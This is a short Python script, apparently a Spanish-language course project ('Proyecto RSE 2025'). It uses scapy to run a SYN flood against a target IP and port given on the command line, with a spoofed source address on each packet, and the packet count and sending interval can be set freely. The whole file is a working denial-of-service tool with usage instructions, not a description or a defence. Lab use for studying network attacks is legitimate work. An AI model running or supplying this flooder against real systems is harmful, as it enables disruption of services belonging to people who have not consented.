#!/usr/bin/env python3
"""
Generador de ataques SYN Flood
Proyecto RSE 2025
"""

import sys
import time
from scapy.all import IP, TCP, send, RandShort

def syn_flood(target_ip, target_port=80, num_packets=100, interval=0.01):
    """
    Genera ataque SYN Flood
    
    Args:
        target_ip: IP de la víctima
        target_port: Puerto objetivo (default 80)
        num_packets: Número de paquetes a enviar
        interval: Intervalo entre paquetes (segundos)
    """
    
    print(f"[*] Iniciando SYN Flood contra {target_ip}:{target_port}")
    print(f"[*] Enviando {num_packets} paquetes...")
    
    for i in range(num_packets):
        # Crear paquete SYN con IP origen aleatoria (IP spoofing)
        ip = IP(
            src=f"192.168.{i % 256}.{(i // 256) % 256}",  # IP aleatoria
            dst=target_ip
        )
        
        tcp = TCP(
            sport=RandShort(),  # Puerto origen aleatorio
            dport=target_port,
            flags='S'  # Flag SYN
        )
        
        packet = ip / tcp
        
        # Enviar paquete (verbose=0 para no mostrar cada paquete)
        send(packet, verbose=0)
        
        if (i + 1) % 10 == 0:
            print(f"[+] Enviados {i + 1}/{num_packets} paquetes")
        
        time.sleep(interval)
    
    print(f"[✓] Ataque completado: {num_packets} paquetes enviados")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 syn_flood.py <IP_victima> [puerto] [num_paquetes] [intervalo]")
        print("Ejemplo: python3 syn_flood.py 10.0.0.1 80 100 0.01")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    packets = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    interval = float(sys.argv[4]) if len(sys.argv) > 4 else 0.01
    
    try:
        syn_flood(target, port, packets, interval)
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido por el usuario")
    except Exception as e:
        print(f"[!] Error: {e}")